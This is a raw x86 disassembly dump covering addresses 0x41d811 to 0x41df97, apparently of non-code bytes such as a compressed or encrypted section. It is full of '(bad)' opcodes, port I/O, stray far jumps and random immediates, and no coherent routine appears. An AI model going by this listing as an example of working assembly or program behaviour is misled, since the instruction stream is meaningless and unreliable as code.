  41d811:	sub    DWORD PTR [eax-0x7e],edi
  41d814:	inc    edx
  41d815:	rcr    al,cl
  41d817:	pop    ss
  41d818:	and    BYTE PTR [esi+0x79],bh
  41d81b:	bound  ebp,QWORD PTR [ebp+0x2e]
  41d81e:	out    0xb8,al
  41d820:	adc    dl,BYTE PTR [esi+0x49cc78b7]
  41d826:	mov    edi,0x36a87bc4
  41d82b:	mov    dh,al
  41d82d:	out    dx,eax
  41d82e:	ja     0x41d7cf
  41d830:	mov    ebp,0xbcb03fbe
  41d835:	adc    esp,ecx
  41d837:	or     ch,BYTE PTR [eax+0x2f]
  41d83a:	xor    esp,DWORD PTR [edx]
  41d83c:	xchg   esp,eax
  41d83d:	out    dx,eax
  41d83e:	jp     0x41d815
  41d840:	and    ebp,esp
  41d842:	jmp    DWORD PTR [esi]
  41d844:	cmp    eax,0x35857b30
  41d849:	rol    dl,0x3b
  41d84c:	and    DWORD PTR [eax-0x32],ecx
  41d84f:	daa    
  41d850:	sub    ch,BYTE PTR [ebx-0x78]
  41d853:	or     eax,0x1bafd16f
  41d858:	push   ds
  41d859:	pop    edx
  41d85a:	xchg   esi,eax
  41d85b:	loope  0x41d7dd
  41d85d:	cs hlt 
  41d85f:	sub    ecx,edi
  41d861:	and    eax,0x744b2edc
  41d866:	or     cl,BYTE PTR [ecx]
  41d868:	push   edi
  41d869:	and    BYTE PTR [edx-0x70],ah
  41d86c:	jp     0x41d882
  41d86e:	mov    bl,bl
  41d870:	push   0xfffffffc
  41d872:	sbb    dl,BYTE PTR [ecx+eax*2+0x21]
  41d876:	hlt    
  41d877:	mov    ebx,0x1924a719
  41d87c:	jb     0x41d82e
  41d87e:	in     eax,dx
  41d87f:	(bad)  
  41d881:	jae    0x41d8ce
  41d883:	push   esp
  41d884:	aaa    
  41d885:	inc    eax
  41d886:	jg     0x41d83a
  41d888:	imul   ebx,DWORD PTR [eax+0x763437cb],0xc119a84a
  41d892:	adc    eax,0x90838a5d
  41d897:	imul   ebp,DWORD PTR [edx],0xffffffec
  41d89a:	ret    0x8534
  41d89d:	jle    0x41d823
  41d89f:	xchg   edi,eax
  41d8a0:	(bad)
  41d8a3:	pop    edx
  41d8a4:	lds    esi,FWORD PTR [ecx-0x7e1b0af5]
  41d8aa:	clc    
  41d8ab:	xchg   esi,eax
  41d8ac:	mov    ecx,0xfc47f375
  41d8b1:	mov    dl,0x75
  41d8b3:	dec    eax
  41d8b4:	lock adc esp,DWORD PTR [edi+edi*4]
  41d8b8:	or     eax,ecx
  41d8ba:	jb     0x41d84f
  41d8bc:	jmp    0x41d85d
  41d8be:	mov    esi,0x8357ed40
  41d8c3:	xor    al,0x6d
  41d8c5:	ss int3 
  41d8c7:	fdivr  QWORD PTR [esi]
  41d8c9:	jge    0x41d8a0
  41d8cb:	mov    cl,0xe
  41d8cd:	and    DWORD PTR [esi+eax*1],0x79
  41d8d1:	jecxz  0x41d94f
  41d8d3:	inc    ebx
  41d8d4:	rcr    BYTE PTR [ebx],0x1e
  41d8d7:	in     eax,dx
  41d8d8:	scas   al,BYTE PTR es:[edi]
  41d8d9:	pusha  
  41d8da:	xchg   edi,eax
  41d8db:	inc    esi
  41d8dc:	or     al,BYTE PTR [edx]
  41d8de:	dec    ecx
  41d8df:	adc    BYTE PTR [edx],0xa2
  41d8e2:	adc    dh,cl
  41d8e4:	jecxz  0x41d938
  41d8e6:	mov    eax,ds:0x28f014b6
  41d8eb:	pop    ebp
  41d8ec:	call   0xe0944814
  41d8f1:	mov    esi,0x17338480
  41d8f6:	xchg   esp,eax
  41d8f7:	stc    
  41d8f8:	xchg   ebp,eax
  41d8f9:	out    0xaa,al
  41d8fb:	and    DWORD PTR [ecx+0x129cd40e],ecx
  41d901:	inc    ecx
  41d902:	fs imul edx
  41d905:	rcr    DWORD PTR [edx-0x1d6d635c],cl
  41d90b:	mov    ah,BYTE PTR [edx-0x3daf723f]
  41d911:	and    ah,bl
  41d913:	into   
  41d914:	mov    ecx,0xb2360e77
  41d919:	outs   dx,DWORD PTR ds:[esi]
  41d91a:	push   ds
  41d91b:	data16 shr BYTE PTR [ecx-0x66],cl
  41d91f:	iret   
  41d920:	dec    ebx
  41d921:	mov    edx,0xa2fdd8b6
  41d926:	push   edx
  41d927:	inc    ebx
  41d928:	xlat   BYTE PTR ds:[ebx]
  41d929:	fwait
  41d92a:	aaa    
  41d92b:	sub    bh,BYTE PTR [ebx]
  41d92d:	jge    0x41d93c
  41d92f:	sbb    BYTE PTR [edi],dh
  41d931:	je     0x41d90a
  41d933:	dec    eax
  41d934:	sub    ecx,DWORD PTR [edi-0x1c2d2767]
  41d93a:	cmp    ah,BYTE PTR [esi+0x6]
  41d93d:	mov    bl,0x26
  41d93f:	xor    al,0x6a
  41d941:	lds    esp,FWORD PTR [eax+ebp*8+0x20439b1a]
  41d948:	fcmovnb st,st(5)
  41d94a:	push   ebx
  41d94b:	(bad)  
  41d94c:	repnz and esp,0x40
  41d950:	call   0x1eaa4bb5
  41d955:	dec    ebp
  41d956:	pop    ebx
  41d957:	(bad)  
  41d959:	push   ss
  41d95a:	pop    ebx
  41d95b:	or     DWORD PTR [edx+0x3713c7a1],esi
  41d961:	push   ebp
  41d962:	sbb    BYTE PTR [ecx-0xcced0b2],dl
  41d968:	ror    BYTE PTR [ecx+edx*4],cl
  41d96b:	stc    
  41d96c:	repz cli 
  41d96e:	ret    0xe0eb
  41d971:	leave  
  41d972:	jae    0x41d901
  41d974:	jge    0x41d9ee
  41d976:	mov    esi,0x3de22fb6
  41d97b:	popa   
  41d97c:	pop    ecx
  41d97d:	rcl    dl,0xd5
  41d980:	add    eax,0xe7dd1b1a
  41d985:	pop    ebx
  41d986:	pop    ebx
  41d987:	inc    edi
  41d988:	retf   0x9cd
  41d98b:	or     BYTE PTR [esi+0x53dfebb2],cl
  41d991:	sbb    al,0x14
  41d993:	out    dx,eax
  41d994:	gs mov ch,0xf7
  41d997:	int    0x71
  41d999:	lods   eax,DWORD PTR ds:[esi]
  41d99a:	push   esp
  41d99b:	aaa    
  41d99c:	add    BYTE PTR [edi+0x5e23b87d],bl
  41d9a2:	sbb    BYTE PTR [ebx+0x0],0xea
  41d9a6:	and    bh,BYTE PTR [edi-0x72]
  41d9a9:	in     eax,0x53
  41d9ab:	mov    esp,0xb4cac6da
  41d9b0:	das    
  41d9b1:	stos   BYTE PTR es:[edi],al
  41d9b2:	repz mov bh,0x7c
  41d9b5:	pop    ebx
  41d9b6:	jmp    0xfc7d:0x376bfe0b
  41d9bd:	test   al,0x7d
  41d9bf:	mov    edi,0xff53ef42
  41d9c4:	dec    esi
  41d9c5:	jmp    0xa91d:0x8c0f11b8
  41d9cc:	(bad)
  41d9cf:	pushf  
  41d9d0:	pop    ecx
  41d9d1:	jp     0x41d97b
  41d9d3:	mov    ch,0x67
  41d9d5:	inc    DWORD PTR cs:[esi+edi*8+0x55]
  41d9da:	ret    0x99d2
  41d9dd:	sar    DWORD PTR [edx],1
  41d9df:	pop    ebp
  41d9e0:	adc    DWORD PTR [edx-0x3e],edx
  41d9e3:	sub    al,0x33
  41d9e5:	and    cl,BYTE PTR [ecx]
  41d9e7:	mov    esi,DWORD PTR [edx+0x79f7723e]
  41d9ed:	jae    0x41da2e
  41d9ef:	xor    eax,0xfb614fda
  41d9f4:	push   es
  41d9f5:	inc    eax
  41d9f6:	cmc    
  41d9f7:	pop    es
  41d9f8:	sbb    BYTE PTR ds:0x90e28a87,0xc3
  41d9ff:	div    DWORD PTR [ecx+eax*1+0x66]
  41da03:	mov    ds:0x2abecb1e,eax
  41da08:	adc    DWORD PTR ds:0x603394f7,0xffffffff
  41da0f:	mov    edi,0xd438e9d
  41da14:	or     DWORD PTR [edx+0x786d1d5b],edi
  41da1a:	idiv   BYTE PTR [esi+0x5b]
  41da1d:	out    dx,eax
  41da1e:	mov    ds:0xdcf1ac1f,eax
  41da23:	ret    
  41da24:	xchg   DWORD PTR [ebx],ebx
  41da26:	jmp    0xa8245797
  41da2b:	mov    bl,0x13
  41da2d:	mov    ebx,0xa5fefff6
  41da32:	scas   al,BYTE PTR es:[edi]
  41da33:	push   ds
  41da34:	adc    edi,DWORD PTR [ecx+0x68]
  41da37:	call   0xf1f:0x164349bd
  41da3e:	push   esi
  41da3f:	test   eax,0xad598228
  41da44:	aam    0xc4
  41da46:	adc    DWORD PTR [ecx],edx
  41da48:	cdq    
  41da49:	fldenv [edi+0x50]
  41da4c:	push   ss
  41da4d:	mov    esi,0x234655ac
  41da52:	loope  0x41dabc
  41da54:	aas    
  41da55:	and    eax,0x97e2a9f
  41da5a:	and    al,0x7a
  41da5c:	mov    esp,0xb47f5930
  41da61:	pop    esp
  41da62:	pop    edx
  41da63:	lock rcr bl,cl
  41da66:	push   edx
  41da67:	lds    edi,FWORD PTR [ebp+ebp*2+0x3a]
  41da6b:	xchg   DWORD PTR [edi+0xb],eax
  41da6e:	inc    esi
  41da6f:	mov    esi,0x8206ba00
  41da74:	inc    ecx
  41da75:	cmp    DWORD PTR [ebx-0x5c],edi
  41da78:	loope  0x41da9b
  41da7a:	xchg   ecx,edx
  41da7c:	jecxz  0x41da5e
  41da7e:	scas   al,BYTE PTR es:[edi]
  41da7f:	cmp    eax,0x3841390c
  41da84:	xchg   DWORD PTR [edx+0x5b],edx
  41da87:	out    0x4,eax
  41da89:	mov    ah,0x6d
  41da8b:	cmp    ah,bh
  41da8d:	sub    DWORD PTR [esi+ecx*8-0x676eb69],0xfffffff2
  41da95:	lock das 
  41da97:	push   eax
  41da98:	push   ebp
  41da99:	mov    ds:0x82fd9c67,al
  41da9e:	sub    ebp,DWORD PTR [edi-0x639f8f27]
  41daa4:	mov    cl,0x33
  41daa6:	jb     0x41daca
  41daa8:	out    0x5,al
  41daaa:	mov    DWORD PTR [ecx],0xd012fe68
  41dab0:	retf   
  41dab1:	xchg   ebx,eax
  41dab2:	(bad)  
  41dab3:	or     eax,0xb9ea18be
  41dab8:	or     al,0x2
  41daba:	push   0x941ec567
  41dabf:	retf   
  41dac0:	daa    
  41dac1:	mov    ah,0x3e
  41dac3:	retf   
  41dac4:	push   eax
  41dac5:	jne    0x41dafe
  41dac7:	cli    
  41dac8:	mov    dh,0xdb
  41daca:	xchg   cl,bl
  41dacc:	ins    DWORD PTR es:[edi],dx
  41dacd:	or     edi,DWORD PTR [edi+ecx*2-0x4dc5c374]
  41dad4:	adc    ecx,DWORD PTR [ebx-0xce1f295]
  41dada:	scas   al,BYTE PTR es:[edi]
  41dadb:	xchg   esi,eax
  41dadc:	pop    ss
  41dadd:	push   0x5d2117eb
  41dae2:	dec    ebx
  41dae3:	test   al,0x9f
  41dae5:	in     al,0x58
  41dae7:	and    BYTE PTR [esi-0x474423e3],ch
  41daed:	cld    
  41daee:	cmp    al,dl
  41daf0:	retf   0x17d0
  41daf3:	mov    al,ds:0xf4e95698
  41daf8:	call   0x23ac2ba5
  41dafd:	sbb    ah,BYTE PTR [ebp-0x16ef7d50]
  41db03:	inc    eax
  41db04:	cmp    BYTE PTR [ebx-0x6c82d357],dl
  41db0a:	mov    ebp,0x161268cb
  41db0f:	aaa    
  41db10:	outs   dx,DWORD PTR ds:[esi]
  41db11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db12:	pop    esp
  41db13:	mov    bl,0x3e
  41db15:	push   es
  41db16:	in     eax,dx
  41db17:	xchg   ecx,eax
  41db18:	jns    0x41db8c
  41db1a:	into   
  41db1b:	jae    0x41db81
  41db1d:	test   al,0xb7
  41db1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db20:	xor    al,0x6d
  41db22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db23:	pop    eax
  41db24:	sub    BYTE PTR [ebp+0x2d],bh
  41db27:	stos   BYTE PTR es:[edi],al
  41db28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db29:	xchg   ebp,eax
  41db2a:	mov    ebp,0x76d5beb7
  41db2f:	cmp    DWORD PTR [ecx-0x419e4eff],0xffffffda
  41db36:	mov    eax,ebp
  41db38:	stc    
  41db39:	(bad)  
  41db3a:	ins    DWORD PTR es:[edi],dx
  41db3b:	nop
  41db3c:	sar    ah,cl
  41db3e:	inc    eax
  41db3f:	adc    DWORD PTR [eax],0x69
  41db42:	dec    esi
  41db43:	lock pusha 
  41db45:	mov    cl,0x43
  41db47:	sar    edx,cl
  41db49:	(bad)  
  41db4a:	fadd   DWORD PTR [eax+0x7f00cd5b]
  41db50:	bound  esp,QWORD PTR [ebp-0x58]
  41db53:	(bad)  
  41db55:	or     BYTE PTR ds:[ebx],bh
  41db58:	cli    
  41db59:	sbb    eax,0x1f09151c
  41db5e:	jge    0x41db2e
  41db60:	mov    esp,0x30b11112
  41db65:	sub    eax,0x6bbed957
  41db6a:	arpl   WORD PTR [ecx],dx
  41db6c:	pop    edi
  41db6d:	(bad)  
  41db6e:	daa    
  41db6f:	add    eax,0xd24370c7
  41db74:	push   ebp
  41db75:	push   edi
  41db76:	inc    ebx
  41db77:	inc    ebp
  41db78:	pop    edx
  41db79:	adc    al,0xd4
  41db7b:	add    edi,DWORD PTR [esi-0xb6934f]
  41db81:	aas    
  41db82:	inc    edx
  41db83:	xchg   edi,eax
  41db84:	inc    BYTE PTR [esi-0x8]
  41db87:	xchg   BYTE PTR [esi-0x3e],dl
  41db8a:	sbb    eax,0x6997b3dc
  41db8f:	mov    edx,0xa0737e1b
  41db94:	mov    eax,0xedda84ee
  41db99:	sub    ah,bl
  41db9b:	mov    al,0xb6
  41db9d:	adc    al,0xcc
  41db9f:	js     0x41dbbc
  41dba1:	xor    bh,BYTE PTR [ebx-0x1b0c158]
  41dba7:	arpl   WORD PTR [ecx],sp
  41dba9:	ret    0x69be
  41dbac:	das    
  41dbad:	stc    
  41dbae:	xor    DWORD PTR [esi+0x5e],edx
  41dbb1:	daa    
  41dbb2:	or     ebx,DWORD PTR [edx-0x15]
  41dbb5:	adc    bl,BYTE PTR [esi-0x38c09332]
  41dbbb:	dec    ecx
  41dbbc:	cli    
  41dbbd:	dec    esp
  41dbbe:	push   cs
  41dbbf:	dec    edx
  41dbc0:	and    al,BYTE PTR [edx]
  41dbc2:	jge    0x41dbfe
  41dbc4:	pop    es
  41dbc5:	stos   DWORD PTR es:[edi],eax
  41dbc6:	xor    ch,BYTE PTR [edx+ebp*8]
  41dbc9:	and    edi,edi
  41dbcb:	jb     0x41dbf1
  41dbcd:	clc    
  41dbce:	mov    eax,ds:0xb5a142ed
  41dbd3:	xor    eax,0x8417f609
  41dbd8:	fsub   QWORD PTR [edi+edx*8]
  41dbdb:	pop    ebx
  41dbdc:	retf   0xbbb2
  41dbdf:	test   eax,edx
  41dbe1:	jmp    0xd34c:0xfc1283b
  41dbe8:	out    dx,al
  41dbe9:	sbb    dl,bh
  41dbeb:	jle    0x41db8a
  41dbed:	pop    edx
  41dbee:	sahf   
  41dbef:	mov    esp,0x5a3b5cf3
  41dbf4:	mov    edx,0x8f9d460e
  41dbf9:	sub    DWORD PTR [ecx-0x2ff75990],esp
  41dbff:	add    DWORD PTR [ebp+0x5a8a5d26],esi
  41dc05:	push   esi
  41dc06:	push   ecx
  41dc07:	call   0xb3ef:0x22754329
  41dc0e:	sub    ecx,DWORD PTR [edi+0x2d]
  41dc11:	fadd   st,st(0)
  41dc13:	ins    DWORD PTR es:[edi],dx
  41dc14:	sub    esi,eax
  41dc16:	pop    es
  41dc17:	push   esp
  41dc18:	leave  
  41dc19:	lds    edx,FWORD PTR [edi-0x6d]
  41dc1c:	sahf   
  41dc1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc1e:	jge    0x41dc76
  41dc20:	mov    ds:0x5d2592ff,al
  41dc25:	mov    ds:0x32bd7be0,eax
  41dc2a:	mov    al,0x6b
  41dc2c:	test   al,0xed
  41dc2e:	stos   BYTE PTR es:[edi],al
  41dc2f:	cwde   
  41dc30:	jp     0x41dc66
  41dc32:	sub    ch,BYTE PTR [eax+0x423010ad]
  41dc38:	clc    
  41dc39:	retf   
  41dc3a:	jnp    0x41dbbf
  41dc3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc3d:	aam    0x8
  41dc3f:	push   ss
  41dc40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc41:	push   cs
  41dc42:	add    ebp,edi
  41dc44:	adc    DWORD PTR [edi+eiz*2],ecx
  41dc47:	fldl2t 
  41dc49:	push   0x76
  41dc4b:	fist   DWORD PTR [edi-0xf]
  41dc4e:	pop    ds
  41dc4f:	xchg   ecx,eax
  41dc50:	mov    al,ds:0xb145e488
  41dc55:	mov    ah,0x2e
  41dc57:	cmp    eax,0xbaf61ff
  41dc5c:	sbb    ecx,DWORD PTR [ecx+0x53a1d573]
  41dc62:	cmc    
  41dc63:	cli    
  41dc64:	add    al,0x2
  41dc66:	inc    ebp
  41dc67:	in     eax,0x31
  41dc69:	pushf  
  41dc6a:	aaa    
  41dc6b:	shl    BYTE PTR [ecx+0x72700395],1
  41dc71:	leave  
  41dc72:	add    al,0x2a
  41dc74:	test   edx,esi
  41dc76:	fadd   st(4),st
  41dc78:	shl    BYTE PTR [edi-0x2636b44d],cl
  41dc7e:	shr    BYTE PTR [edi],1
  41dc80:	leave  
  41dc81:	add    ah,dl
  41dc83:	cld    
  41dc84:	cld    
  41dc85:	outs   dx,DWORD PTR es:[esi]
  41dc87:	or     al,0xbe
  41dc89:	sub    al,0x99
  41dc8b:	das    
  41dc8c:	aaa    
  41dc8d:	cmp    BYTE PTR [eax+0x4b],dh
  41dc90:	mov    esp,0x28988538
  41dc95:	xchg   ecx,eax
  41dc96:	jae    0x41dc6f
  41dc98:	push   ds
  41dc99:	jmp    0x41dce3
  41dc9b:	xor    al,BYTE PTR [esi-0x7f613828]
  41dca1:	mov    eax,ds:0x9538686c
  41dca6:	lods   al,BYTE PTR ds:[esi]
  41dca7:	jns    0x41dcbe
  41dca9:	iret   
  41dcaa:	jg     0x41dd28
  41dcac:	inc    edx
  41dcad:	stc    
  41dcae:	sbb    eax,0xee1fc385
  41dcb3:	sub    eax,DWORD PTR [eax+0x0]
  41dcb6:	jg     0x41dc7b
  41dcb8:	(bad)  
  41dcb9:	cmc    
  41dcba:	dec    ebx
  41dcbb:	in     al,dx
  41dcbc:	out    0x95,al
  41dcbe:	out    0xb7,eax
  41dcc0:	push   cs
  41dcc1:	jp     0x41dd32
  41dcc3:	pop    ebp
  41dcc4:	je     0x41dc46
  41dcc6:	sbb    eax,0x9930dbda
  41dccb:	aas    
  41dccc:	shr    cl,cl
  41dcce:	xchg   ebx,eax
  41dccf:	dec    edx
  41dcd0:	pop    ss
  41dcd1:	push   0x1c
  41dcd3:	or     BYTE PTR [esi+0x44],cl
  41dcd6:	cmp    BYTE PTR [ebx-0x754cf603],0xf1
  41dcdd:	and    eax,0xce00d130
  41dce2:	xor    DWORD PTR [ebp+0x45],esp
  41dce5:	and    eax,0xd05e9377
  41dcea:	jae    0x41dd1f
  41dcec:	test   BYTE PTR [ecx+eiz*2],ah
  41dcef:	inc    eax
  41dcf0:	ss inc edx
  41dcf2:	xchg   edx,eax
  41dcf3:	xlat   BYTE PTR ds:[ebx]
  41dcf4:	push   0x65312ffd
  41dcf9:	ds inc edx
  41dcfb:	in     eax,0x41
  41dcfd:	mov    al,0xb5
  41dcff:	push   cs
  41dd00:	add    al,0x12
  41dd02:	test   BYTE PTR [edx],ah
  41dd04:	mov    dl,BYTE PTR [esi-0x71]
  41dd07:	iret   
  41dd08:	pop    edi
  41dd09:	adc    esp,edx
  41dd0b:	mov    DWORD PTR [edx+0x2a4817],ecx
  41dd11:	mov    al,0x9d
  41dd13:	adc    eax,0x882fcb98
  41dd18:	sub    BYTE PTR [eax],dh
  41dd1a:	retf   0x2f7c
  41dd1d:	(bad)  
  41dd1e:	imul   esi,DWORD PTR ds:0xe6a59ec,0x8b3612b6
  41dd28:	and    eax,0x9a2ca57
  41dd2d:	hlt    
  41dd2e:	test   eax,0x1616d0a7
  41dd33:	xlat   BYTE PTR ds:[ebx]
  41dd34:	xchg   esi,eax
  41dd35:	sbb    bl,BYTE PTR [ebx+0x2fc34cba]
  41dd3b:	cmp    DWORD PTR [edi+eax*2-0x5cda806c],0xd90df93
  41dd46:	cwde   
  41dd47:	nop
  41dd48:	imul   esp,DWORD PTR [eax],0x2483d0e4
  41dd4e:	out    0xf5,eax
  41dd50:	out    dx,eax
  41dd51:	rcl    BYTE PTR [edi+0x74],cl
  41dd54:	pop    esp
  41dd55:	cmp    eax,0x394fefd7
  41dd5a:	cmp    eax,0x995852ec
  41dd5f:	in     eax,dx
  41dd60:	rcl    al,cl
  41dd62:	mov    cl,0x8e
  41dd64:	push   edi
  41dd65:	mov    edx,0x15fc1704
  41dd6a:	int3   
  41dd6b:	xor    dh,BYTE PTR [edi-0x1b043f36]
  41dd71:	sar    BYTE PTR [esi+0x6affb7ad],1
  41dd77:	mov    ds:0x49f161ba,al
  41dd7c:	les    esi,FWORD PTR [edx+0x21]
  41dd7f:	push   cs
  41dd80:	add    al,0x6b
  41dd82:	out    dx,eax
  41dd83:	outs   dx,BYTE PTR ds:[esi]
  41dd84:	adc    ebx,DWORD PTR [esi+0x27d7a796]
  41dd8a:	mov    dl,0x7b
  41dd8c:	je     0x41dd42
  41dd8e:	jp     0x41dda4
  41dd90:	mov    bl,0x35
  41dd92:	push   ds
  41dd93:	sub    BYTE PTR [eax+0x5ea35b66],0xb9
  41dd9a:	mov    edi,0xa0acf8dd
  41dd9f:	mov    bh,0xeb
  41dda1:	gs aad 0xf8
  41dda4:	stos   BYTE PTR es:[edi],al
  41dda5:	in     al,0x50
  41dda7:	je     0x41dd2b
  41dda9:	nop
  41ddaa:	pushf  
  41ddab:	fwait
  41ddac:	into   
  41ddad:	and    dl,dl
  41ddaf:	and    DWORD PTR [esi+0x30],ebp
  41ddb2:	lods   al,BYTE PTR ds:[esi]
  41ddb3:	mov    ch,BYTE PTR ds:0x5fe127e0
  41ddb9:	or     eax,0x54c77a01
  41ddbe:	mov    ah,0xfd
  41ddc0:	mov    edx,0xf83c9ab0
  41ddc5:	add    DWORD PTR [eax-0x6f],edx
  41ddc8:	inc    ecx
  41ddc9:	test   al,0xe8
  41ddcb:	hlt    
  41ddcc:	sbb    al,0x4e
  41ddce:	mov    ds:0xb15adf95,al
  41ddd3:	imul   ebp,DWORD PTR [eax],0x6235e0af
  41ddd9:	ins    DWORD PTR es:[edi],dx
  41ddda:	stc    
  41dddb:	jmp    0x41dd7a
  41dddd:	or     DWORD PTR [ebp-0x3bafa954],ebx
  41dde3:	mov    bl,0x63
  41dde5:	mov    WORD PTR [edi-0x2],cs
  41dde8:	retf   
  41dde9:	mov    WORD PTR [esi+esi*8],ds
  41ddec:	mov    BYTE PTR [esi],0xab
  41ddef:	dec    ebp
  41ddf0:	or     BYTE PTR [esi+0x3d],al
  41ddf3:	lds    edi,FWORD PTR [ebx+edx*2-0x209b5976]
  41ddfa:	mov    ecx,0x7adacd53
  41ddff:	jnp    0x41dda1
  41de01:	or     al,0x93
  41de03:	mov    cl,0xe8
  41de05:	cdq    
  41de06:	or     eax,0xf7dc2690
  41de0b:	ja     0x41de31
  41de0d:	mov    ebx,DWORD PTR [ecx-0x33]
  41de10:	inc    esp
  41de11:	sbb    DWORD PTR [esi],esi
  41de13:	cmp    eax,0x5d0dd0f1
  41de18:	pop    ecx
  41de19:	and    al,0x86
  41de1b:	inc    esi
  41de1c:	fimul  DWORD PTR [edi]
  41de1e:	gs aaa 
  41de20:	or     DWORD PTR [edx-0x6d],esi
  41de23:	lds    edx,FWORD PTR [ebp-0x78]
  41de26:	mov    al,ds:0xc5ee8ed3
  41de2b:	cli    
  41de2c:	push   ss
  41de2d:	push   ebx
  41de2e:	fcom   st(1)
  41de30:	jge    0x41de07
  41de32:	ja     0x41de31
  41de34:	icebp  
  41de35:	jns    0x41dddb
  41de37:	ins    DWORD PTR es:[edi],dx
  41de38:	(bad)  
  41de39:	jle    0x41ddde
  41de3b:	pop    ss
  41de3c:	fdivrp st(0),st
  41de3e:	fs nop
  41de40:	retf   
  41de41:	jmp    0x725e:0xf30a1446
  41de48:	and    eax,0xb63f9c68
  41de4d:	int3   
  41de4e:	dec    edx
  41de4f:	jnp    0x41dea9
  41de51:	cdq    
  41de52:	push   ss
  41de53:	test   DWORD PTR [edi],edi
  41de55:	xchg   ebp,eax
  41de56:	adc    DWORD PTR [eax],edx
  41de58:	sbb    BYTE PTR [edx],ch
  41de5a:	arpl   WORD PTR [ebx],bx
  41de5c:	adc    al,0x68
  41de5e:	ret    
  41de5f:	fs and esi,eax
  41de62:	clc    
  41de63:	push   ss
  41de64:	test   edi,ecx
  41de66:	cs mov eax,0x88cb1d9a
  41de6c:	dec    esp
  41de6d:	cmp    ch,BYTE PTR [esi+0x78]
  41de70:	inc    edx
  41de71:	repnz (bad) 
  41de73:	sub    cl,dh
  41de75:	imul   eax,DWORD PTR [ebx*1+0x726c33a2],0x41
  41de7d:	lods   eax,DWORD PTR ds:[esi]
  41de7e:	daa    
  41de7f:	mov    eax,0x9eef8c13
  41de84:	inc    esp
  41de85:	test   al,0x2c
  41de87:	push   0x70
  41de89:	popa   
  41de8a:	and    eax,0x406ee6d0
  41de8f:	cdq    
  41de90:	pusha  
  41de91:	add    eax,0xa6191373
  41de96:	mov    ds:0x3e0d186e,al
  41de9b:	nop
  41de9c:	dec    esp
  41de9d:	test   DWORD PTR [esp+eax*4],edx
  41dea0:	cmp    BYTE PTR [ebx-0x39d83962],bl
  41dea6:	stos   BYTE PTR es:[edi],al
  41dea7:	in     al,dx
  41dea8:	xor    ebx,DWORD PTR [esi-0x15]
  41deab:	push   esp
  41deac:	dec    eax
  41dead:	mov    al,0xb8
  41deaf:	mov    ebx,0x1492b782
  41deb4:	sbb    BYTE PTR [edx-0x6d0d83fd],bl
  41deba:	mov    esp,0xa2cb65e
  41debf:	inc    ecx
  41dec0:	mov    ?,WORD PTR [ecx+eiz*8-0x33769589]
  41dec7:	cdq    
  41dec8:	imul   esi,DWORD PTR [edi-0x7f3e5092],0xffffffa2
  41decf:	pop    ds
  41ded0:	pop    eax
  41ded1:	fisubr DWORD PTR [esi-0x37]
  41ded4:	xchg   esp,eax
  41ded5:	jnp    0x41de9c
  41ded7:	inc    esi
  41ded8:	sub    ch,BYTE PTR [edi+0x3d]
  41dedb:	and    ah,ch
  41dedd:	push   es
  41dede:	xchg   DWORD PTR [edi+0x292ddc8f],edi
  41dee4:	add    bl,bl
  41dee6:	or     al,0xd6
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	clc    
  41deea:	cdq    
  41deeb:	pushf  
  41deec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deed:	inc    esi
  41deee:	and    eax,0x251cf8ca
  41def3:	sub    DWORD PTR [ebp-0xe8d70d],esi
  41def9:	out    dx,al
  41defa:	rcr    BYTE PTR ds:0xef83c00,1
  41df00:	outs   dx,BYTE PTR ds:[esi]
  41df01:	shl    BYTE PTR [eax-0x60],1
  41df04:	std    
  41df05:	cmp    BYTE PTR [ecx-0x37d9610b],bl
  41df0b:	push   0x5a
  41df0d:	add    al,0x60
  41df0f:	ds in  eax,dx
  41df11:	pusha  
  41df12:	inc    edi
  41df13:	push   0x1c
  41df15:	lahf   
  41df16:	push   0x79
  41df18:	mov    ah,0xa1
  41df1a:	std    
  41df1b:	dec    eax
  41df1c:	shl    BYTE PTR [eax-0x3d],0x1e
  41df20:	lods   al,BYTE PTR ds:[esi]
  41df21:	mov    dh,0xe6
  41df23:	repz mov edi,0xa186418d
  41df29:	neg    BYTE PTR [edi]
  41df2b:	mov    ebp,0x7ed4db3c
  41df30:	jo     0x41df09
  41df32:	jge    0x41df94
  41df34:	or     dl,BYTE PTR [esi]
  41df36:	cmp    dl,BYTE PTR [esi]
  41df38:	sbb    ah,BYTE PTR [edx]
  41df3a:	idiv   BYTE PTR [ebx+ecx*8-0x3a]
  41df3e:	repnz xor al,0xea
  41df41:	push   esp
  41df42:	rcr    BYTE PTR [ebx-0x2b],cl
  41df45:	xchg   edx,eax
  41df46:	(bad)  
  41df47:	loope  0x41dfa9
  41df49:	fs js  0x41df07
  41df4c:	inc    esp
  41df4d:	pop    eax
  41df4e:	pop    eax
  41df4f:	sbb    BYTE PTR [ecx+eax*1],dl
  41df52:	jne    0x41dfd2
  41df54:	pop    es
  41df55:	sub    eax,0x2caa00dc
  41df5a:	push   esi
  41df5b:	inc    edi
  41df5c:	cmc    
  41df5d:	xchg   esi,eax
  41df5e:	jb     0x41df8b
  41df60:	fcomp  QWORD PTR [edx+0x7de8f486]
  41df66:	adc    ecx,DWORD PTR [edi]
  41df68:	xchg   ebx,eax
  41df69:	ret    0x857f
  41df6c:	inc    eax
  41df6d:	ins    BYTE PTR es:[edi],dx
  41df6e:	pop    ebp
  41df6f:	mov    ah,0x9b
  41df71:	ins    BYTE PTR es:[edi],dx
  41df72:	sub    eax,0xd7dd5686
  41df77:	shl    DWORD PTR [eax],cl
  41df79:	(bad)  
  41df7a:	cmp    cl,BYTE PTR [edx]
  41df7c:	push   ds
  41df7d:	cmp    BYTE PTR [ebp-0x79],dh
  41df80:	cs fs jl 0x41df6d
  41df84:	pop    edi
  41df85:	dec    ecx
  41df86:	dec    eax
  41df87:	stos   DWORD PTR es:[edi],eax
  41df88:	loopne 0x41df0d
  41df8a:	pop    es
  41df8b:	js     0x41df9c
  41df8d:	jns    0x41dff1
  41df8f:	test   BYTE PTR ds:0x1efa27d7,ah
  41df95:	jbe    0x41df8e
  41df97:	shl    DWORD PTR [ebx],cl
